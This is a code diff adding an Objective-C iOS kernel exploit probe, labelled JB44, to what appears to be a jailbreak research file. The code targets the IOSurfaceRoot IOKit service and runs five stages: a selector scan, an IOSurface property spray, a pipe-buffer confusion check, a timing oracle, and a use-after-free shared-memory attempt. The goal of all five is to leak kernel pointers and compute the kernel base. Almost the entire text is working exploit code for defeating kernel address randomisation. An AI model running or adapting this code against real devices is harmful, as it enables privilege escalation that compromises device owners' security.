@@ -36703,3 +36703,434 @@ void iosurface_kptr_leak(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+#pragma mark - JB44: Registry Exploitation + Property Confusion
+
+void iosurface_registry_exploit_v2(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB44: === Registry Exploitation + Property Confusion ===");
+        log(@"JB44: Strategy: selector scan + property spray + pipe oracle + timing");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB44";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+        typedef void*(*surfcreate_fn)(void*);
+        typedef uint32_t(*surfgetid_fn)(void*);
+        typedef int(*surflock_fn)(void*, uint32_t, uint32_t*);
+        typedef int(*surfunlock_fn)(void*, uint32_t, uint32_t*);
+        typedef void*(*surfgetbase_fn)(void*);
+        typedef size_t(*surfgetalloc_fn)(void*);
+        typedef void(*surfsetval_fn)(void*, CFStringRef, CFTypeRef);
+        typedef CFTypeRef(*surfgetval_fn)(void*, CFStringRef);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        surfcreate_fn sym_surfcreate = (surfcreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        surfgetid_fn sym_surfgetid = (surfgetid_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        surflock_fn sym_surflock = (surflock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        surfunlock_fn sym_surfunlock = (surfunlock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+        surfgetbase_fn sym_surfgetbase = (surfgetbase_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        surfgetalloc_fn sym_surfgetalloc = (surfgetalloc_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        surfsetval_fn sym_surfsetval = (surfsetval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+        surfgetval_fn sym_surfgetval = (surfgetval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async) {
+            log(@"JB44: FAIL — dlsym IOKit missing");
+            results[@"verdict"] = @"DLSYM_FAIL";
+            done(results);
+            return;
+        }
+
+        log([NSString stringWithFormat:@"JB44: surfSetVal=%d surfGetVal=%d", !!sym_surfsetval, !!sym_surfgetval]);
+
+        void *matchDict = sym_matching("IOSurfaceRoot");
+        unsigned int svc = matchDict ? sym_getmatch(0, matchDict) : 0;
+        if (!svc) {
+            log(@"JB44: FAIL — no service");
+            results[@"verdict"] = @"NO_SERVICE";
+            done(results);
+            return;
+        }
+
+        uint32_t SEL_REG = 17;
+        uint32_t SEL_DEREG = 18;
+        int bestShape = 1;
+
+        log(@"JB44: ========== G1: Extended Selector Scan ==========");
+        int g1NewSels = 0;
+        uint32_t g1Results[24] = {0};
+        {
+            unsigned int oConn = 0, gConn = 0;
+            sym_open(svc, mach_task_self(), 0, &oConn);
+            sym_open(svc, mach_task_self(), 0, &gConn);
+            if (oConn && gConn) {
+                unsigned int wp = jb41_newWakePort();
+                uint64_t in[3] = {1, 2, 3};
+                jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                unsigned int gPorts[512]; int gCount = 0;
+                jb42_groomWithFields(gConn, 0x1, 0x1122334455667788ull, 0x4141414141414141ull, 0x42424242ull, 24, 512, gPorts, &gCount, sym_async);
+
+                int rdup = jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                log([NSString stringWithFormat:@"JB44: [G1] re-reg dup=0x%x(%s) groom=%d", (uint32_t)rdup, jb41_rcName((uint32_t)rdup), gCount]);
+
+                for (uint32_t sel = 19; sel <= 30; sel++) {
+                    if (isr_stopped()) break;
+                    uint64_t outS[16] = {0};
+                    uint32_t outSCnt = 16;
+                    uint8_t outBuf[256]; memset(outBuf, 0, 256);
+                    size_t outBufSz = 256;
+                    int rcSync = sym_call(oConn, sel, NULL, 0, in, 24, outS, &outSCnt, outBuf, &outBufSz);
+                    g1Results[(sel - 19) * 2] = (uint32_t)rcSync;
+
+                    uint64_t outAS[16] = {0};
+                    uint32_t outASCnt = 16;
+                    int rcAsync = jb42_callSelWithOutput(oConn, sel, in, 24, bestShape, wp, outAS, &outASCnt, outBuf, &outBufSz, sym_call, sym_async);
+                    g1Results[(sel - 19) * 2 + 1] = (uint32_t)rcAsync;
+
+                    int hasData = 0;
+                    for (int b = 0; b < 256; b++) { if (outBuf[b] != 0) { hasData = 1; break; } }
+                    int hasScalar = 0;
+                    for (int s = 0; s < 16; s++) { if (outS[s] != 0 || outAS[s] != 0) { hasScalar = 1; break; } }
+
+                    if ((uint32_t)rcSync != 0xE00002C2 || (uint32_t)rcAsync != 0xE00002C2 || hasData || hasScalar) {
+                        g1NewSels++;
+                        log([NSString stringWithFormat:@"JB44: [G1] sel%u sync=0x%x async=0x%x data=%d scalar=%d outSCnt=%u", sel, (uint32_t)rcSync, (uint32_t)rcAsync, hasData, hasScalar, outSCnt]);
+                        if (hasScalar) {
+                            log([NSString stringWithFormat:@"JB44: [G1] sel%u s0=0x%llx s1=0x%llx", sel, (unsigned long long)outS[0], (unsigned long long)outAS[0]]);
+                        }
+                        if (hasData) {
+                            uint64_t *dw = (uint64_t *)outBuf;
+                            log([NSString stringWithFormat:@"JB44: [G1] sel%u buf: 0x%llx 0x%llx 0x%llx 0x%llx", sel, (unsigned long long)dw[0], (unsigned long long)dw[1], (unsigned long long)dw[2], (unsigned long long)dw[3]]);
+                        }
+                    }
+                }
+
+                jb42_freeGroom(gPorts, gCount);
+                jb41_dropPort(wp);
+                sym_close(oConn);
+                sym_close(gConn);
+            }
+        }
+        results[@"g1_newSels"] = @(g1NewSels);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB44: ========== G2: IOSurface Property Spray ==========");
+        int g2Anomalies = 0;
+        {
+            if (sym_surfcreate && sym_surfsetval && sym_surfgetval) {
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @32,
+                    @"IOSurfaceHeight": @32,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                void *surf = sym_surfcreate((__bridge void *)props);
+                if (surf) {
+                    unsigned int oConn = 0;
+                    sym_open(svc, mach_task_self(), 0, &oConn);
+                    if (oConn) {
+                        for (int trial = 0; trial < 5; trial++) {
+                            if (isr_stopped()) break;
+                            unsigned int wp = jb41_newWakePort();
+                            uint64_t in[3] = {1, 2, 3};
+                            jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                            jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                            for (int p = 0; p < 128; p++) {
+                                NSString *key = [NSString stringWithFormat:@"spray_%d_%d", trial, p];
+                                uint8_t val[24]; memset(val, 0xDD, 24);
+                                NSData *data = [NSData dataWithBytes:val length:24];
+                                sym_surfsetval(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)data);
+                            }
+
+                            int rdup = jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                            if ((uint32_t)rdup != 0 && (uint32_t)rdup != 0xE00002C9) g2Anomalies++;
+                            log([NSString stringWithFormat:@"JB44: [G2] trial=%d dup=0x%x(%s)", trial, (uint32_t)rdup, jb41_rcName((uint32_t)rdup)]);
+                            jb41_dropPort(wp);
+                        }
+                        sym_close(oConn);
+                    }
+                }
+            } else {
+                log(@"JB44: [G2] SKIP — IOSurface property syms missing");
+            }
+        }
+        results[@"g2_anomalies"] = @(g2Anomalies);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB44: ========== G3: Pipe Buffer Confusion ==========");
+        int g3KptrsFound = 0;
+        uint64_t g3BestKptr = 0;
+        {
+            unsigned int oConn = 0;
+            sym_open(svc, mach_task_self(), 0, &oConn);
+            if (oConn) {
+                for (int trial = 0; trial < 5; trial++) {
+                    if (isr_stopped()) break;
+                    unsigned int wp = jb41_newWakePort();
+                    uint64_t in[3] = {1, 2, 3};
+                    jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                    int pipefds[32][2];
+                    int pipeCount = 0;
+                    for (int p = 0; p < 32; p++) {
+                        if (pipe(pipefds[p]) == 0) {
+                            uint8_t fill[24]; memset(fill, 0xEE, 24);
+                            ssize_t w = write(pipefds[p][1], fill, 24);
+                            if (w == 24) pipeCount++;
+                        }
+                    }
+
+                    int rdup = jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+
+                    int foundInPipe = 0;
+                    for (int p = 0; p < 32; p++) {
+                        uint8_t rbuf[64]; memset(rbuf, 0, 64);
+                        ssize_t rd = read(pipefds[p][0], rbuf, 24);
+                        if (rd > 0) {
+                            int changed = 0;
+                            for (int b = 0; b < 24; b++) { if (rbuf[b] != 0xEE) changed++; }
+                            if (changed > 0) {
+                                foundInPipe++;
+                                uint64_t *qw = (uint64_t *)rbuf;
+                                for (int q = 0; q < 3; q++) {
+                                    if ((qw[q] & 0xFFFFFFF000000000ull) == 0xFFFFFFF000000000ull) {
+                                        g3KptrsFound++;
+                                        if (!g3BestKptr) g3BestKptr = qw[q];
+                                        log([NSString stringWithFormat:@"JB44: [G3] KPTR pipe[%d] offset=%d: 0x%llx", p, q * 8, (unsigned long long)qw[q]]);
+                                    }
+                                }
+                                log([NSString stringWithFormat:@"JB44: [G3] pipe[%d] changed=%d vals: 0x%llx 0x%llx 0x%llx", p, changed, (unsigned long long)qw[0], (unsigned long long)qw[1], (unsigned long long)qw[2]]);
+                            }
+                        }
+                        close(pipefds[p][0]);
+                        close(pipefds[p][1]);
+                    }
+
+                    log([NSString stringWithFormat:@"JB44: [G3] trial=%d dup=0x%x pipes=%d changed=%d", trial, (uint32_t)rdup, pipeCount, foundInPipe]);
+                    jb41_dropPort(wp);
+                }
+                sym_close(oConn);
+            }
+        }
+        results[@"g3_kptrs"] = @(g3KptrsFound);
+        if (g3BestKptr) results[@"g3_bestKptr"] = [NSString stringWithFormat:@"0x%llx", (unsigned long long)g3BestKptr];
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB44: ========== G4: Timing Oracle ==========");
+        int g4TimingDiff = 0;
+        {
+            unsigned int oConn = 0, gConn = 0;
+            sym_open(svc, mach_task_self(), 0, &oConn);
+            sym_open(svc, mach_task_self(), 0, &gConn);
+            if (oConn && gConn) {
+                uint64_t timesValid[10] = {0};
+                uint64_t timesInvalid[10] = {0};
+                uint64_t timesNoGroom[10] = {0};
+
+                for (int trial = 0; trial < 10; trial++) {
+                    if (isr_stopped()) break;
+                    unsigned int wp = jb41_newWakePort();
+                    uint64_t in[3] = {1, 2, 3};
+
+                    jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                    uint64_t t0 = mach_absolute_time();
+                    jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    uint64_t t1 = mach_absolute_time();
+                    timesNoGroom[trial] = t1 - t0;
+                    jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                    jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                    unsigned int gPorts[128]; int gCount = 0;
+                    jb42_groomWithFields(gConn, 0x1, 0x4242424242424242ull, 0xFFFFFFF007004000ull, 0x0, 24, 128, gPorts, &gCount, sym_async);
+
+                    t0 = mach_absolute_time();
+                    jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    t1 = mach_absolute_time();
+                    timesValid[trial] = t1 - t0;
+                    jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+                    jb42_freeGroom(gPorts, gCount);
+
+                    jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                    jb42_groomWithFields(gConn, 0x1, 0x4242424242424242ull, 0xDEADBEEFCAFEull, 0x0, 24, 128, gPorts, &gCount, sym_async);
+
+                    t0 = mach_absolute_time();
+                    jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    t1 = mach_absolute_time();
+                    timesInvalid[trial] = t1 - t0;
+
+                    jb42_freeGroom(gPorts, gCount);
+                    jb41_dropPort(wp);
+                }
+
+                uint64_t avgValid = 0, avgInvalid = 0, avgNoGroom = 0;
+                for (int i = 0; i < 10; i++) { avgValid += timesValid[i]; avgInvalid += timesInvalid[i]; avgNoGroom += timesNoGroom[i]; }
+                avgValid /= 10; avgInvalid /= 10; avgNoGroom /= 10;
+
+                int64_t diff = (int64_t)avgValid - (int64_t)avgInvalid;
+                int64_t pctDiff = avgInvalid ? (diff * 100) / (int64_t)avgInvalid : 0;
+                if (pctDiff < 0) pctDiff = -pctDiff;
+                if (pctDiff > 15) g4TimingDiff = 1;
+
+                log([NSString stringWithFormat:@"JB44: [G4] avgNoGroom=%llu avgValid=%llu avgInvalid=%llu diff=%lld pct=%lld%%", (unsigned long long)avgNoGroom, (unsigned long long)avgValid, (unsigned long long)avgInvalid, (long long)diff, (long long)pctDiff]);
+                log([NSString stringWithFormat:@"JB44: [G4] valid: %llu %llu %llu %llu %llu", (unsigned long long)timesValid[0], (unsigned long long)timesValid[1], (unsigned long long)timesValid[2], (unsigned long long)timesValid[3], (unsigned long long)timesValid[4]]);
+                log([NSString stringWithFormat:@"JB44: [G4] invalid: %llu %llu %llu %llu %llu", (unsigned long long)timesInvalid[0], (unsigned long long)timesInvalid[1], (unsigned long long)timesInvalid[2], (unsigned long long)timesInvalid[3], (unsigned long long)timesInvalid[4]]);
+
+                sym_close(oConn);
+                sym_close(gConn);
+            }
+        }
+        results[@"g4_timingDiff"] = @(g4TimingDiff);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; if (sym_release) sym_release(svc); done(results); return; }
+
+        log(@"JB44: ========== G5: Combined CVE Write + UAF Shmem ==========");
+        int g5KptrsFound = 0;
+        uint64_t g5BestKptr = 0;
+        {
+            if (sym_surfcreate && sym_surflock && sym_surfgetbase && sym_surfgetalloc) {
+                NSDictionary *shmProps = @{
+                    @"IOSurfaceWidth": @64,
+                    @"IOSurfaceHeight": @64,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                void *surf = sym_surfcreate((__bridge void *)shmProps);
+                if (surf) {
+                    size_t allocSz = sym_surfgetalloc(surf);
+                    sym_surflock(surf, 2, NULL);
+                    void *base = sym_surfgetbase(surf);
+
+                    if (base && allocSz > 0) {
+                        memset(base, 0xCC, allocSz);
+                        log([NSString stringWithFormat:@"JB44: [G5] shmem at 0x%llx size=%zu filled 0xCC", (unsigned long long)(uintptr_t)base, allocSz]);
+
+                        unsigned int oConn = 0, gConn = 0;
+                        sym_open(svc, mach_task_self(), 0, &oConn);
+                        sym_open(svc, mach_task_self(), 0, &gConn);
+
+                        if (oConn && gConn) {
+                            for (int trial = 0; trial < 5; trial++) {
+                                if (isr_stopped()) break;
+                                unsigned int wp = jb41_newWakePort();
+                                uint64_t in[3] = {1, 2, 3};
+                                jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                                jb41_callSel(oConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                                unsigned int gPorts[128]; int gCount = 0;
+                                uint8_t fbuf[64]; memset(fbuf, 0, 64);
+                                uint64_t *ff = (uint64_t *)fbuf;
+                                ff[0] = 0x1;
+                                ff[1] = 0x1122334455667788ull;
+                                ff[2] = (uint64_t)(uintptr_t)base;
+                                uint64_t gRef = 0xA1B2C3D4E5F60708ull;
+                                for (int g = 0; g < 128; g++) {
+                                    unsigned int gwp = jb41_newWakePort();
+                                    if (!gwp) continue;
+                                    int gr = sym_async(gConn, 1000, gwp, &gRef, 1, NULL, 0, fbuf, 24, NULL, NULL, NULL, NULL);
+                                    if (gr == 0 || (uint32_t)gr == 0xE00002C2) { gPorts[gCount++] = gwp; } else { jb41_dropPort(gwp); }
+                                }
+
+                                int rdup = jb41_callSel(oConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+
+                                uint64_t outS[16] = {0};
+                                uint32_t outSCnt = 16;
+                                uint8_t outBuf[256]; memset(outBuf, 0, 256);
+                                size_t outBufSz = 256;
+                                for (uint32_t sel = 17; sel <= 25; sel++) {
+                                    outSCnt = 16; outBufSz = 256;
+                                    memset(outBuf, 0, 256); memset(outS, 0, sizeof(outS));
+                                    int rc = sym_call(oConn, sel, NULL, 0, in, 24, outS, &outSCnt, outBuf, &outBufSz);
+                                    if ((uint32_t)rc != 0xE00002C2) {
+                                        log([NSString stringWithFormat:@"JB44: [G5] sel%u rc=0x%x outSCnt=%u outBufSz=%zu", sel, (uint32_t)rc, outSCnt, outBufSz]);
+                                    }
+                                }
+
+                                uint64_t *scan = (uint64_t *)base;
+                                size_t nqw = allocSz / 8;
+                                int changed = 0;
+                                for (size_t q = 0; q < nqw; q++) {
+                                    if (scan[q] != 0xCCCCCCCCCCCCCCCCull) {
+                                        changed++;
+                                        if ((scan[q] & 0xFFFFFFF000000000ull) == 0xFFFFFFF000000000ull) {
+                                            g5KptrsFound++;
+                                            if (!g5BestKptr) g5BestKptr = scan[q];
+                                            log([NSString stringWithFormat:@"JB44: [G5] KPTR at shmem+%zu: 0x%llx", q * 8, (unsigned long long)scan[q]]);
+                                        } else if (scan[q] != 0 && changed <= 8) {
+                                            log([NSString stringWithFormat:@"JB44: [G5] changed[%zu]=0x%llx", q * 8, (unsigned long long)scan[q]]);
+                                        }
+                                    }
+                                }
+
+                                log([NSString stringWithFormat:@"JB44: [G5] trial=%d dup=0x%x changed=%d kptrs=%d", trial, (uint32_t)rdup, changed, g5KptrsFound]);
+                                memset(base, 0xCC, allocSz);
+
+                                for (int g = 0; g < gCount; g++) jb41_dropPort(gPorts[g]);
+                                jb41_dropPort(wp);
+                                usleep(3000);
+                            }
+                            sym_close(oConn);
+                            sym_close(gConn);
+                        }
+                    }
+                    sym_surfunlock(surf, 0, NULL);
+                }
+            } else {
+                log(@"JB44: [G5] SKIP — IOSurface shmem syms missing");
+            }
+        }
+        results[@"g5_kptrs"] = @(g5KptrsFound);
+        if (g5BestKptr) results[@"g5_bestKptr"] = [NSString stringWithFormat:@"0x%llx", (unsigned long long)g5BestKptr];
+
+        if (sym_release) sym_release(svc);
+
+        NSString *verdict;
+        if (g3KptrsFound > 0 || g5KptrsFound > 0) {
+            verdict = @"KPTR_LEAK";
+            uint64_t best = g3BestKptr ? g3BestKptr : g5BestKptr;
+            uint64_t kbase = best & 0xFFFFFFFFF0000000ull;
+            results[@"kernelBase"] = [NSString stringWithFormat:@"0x%llx", (unsigned long long)kbase];
+            log([NSString stringWithFormat:@"JB44: [!!!!!] KERNEL POINTER LEAKED — ptr=0x%llx base=0x%llx", (unsigned long long)best, (unsigned long long)kbase]);
+        } else if (g1NewSels > 0) {
+            verdict = @"NEW_SELECTORS";
+            log([NSString stringWithFormat:@"JB44: [!!!] Found %d new working selectors — explore further", g1NewSels]);
+        } else if (g4TimingDiff) {
+            verdict = @"TIMING_ORACLE";
+            log(@"JB44: [!!] Timing difference detected — kernel addr dereference side-channel");
+        } else {
+            verdict = @"NO_LEAK";
+            log(@"JB44: No kernel pointers — need alternative strategy");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB44: Verdict: %@", verdict]);
+        log(@"JB44: =============================================");
+
+        isr_checkpoint(@"JB44-regexploit-checkpoint.json", results);
+        done(results);
+    });
+}
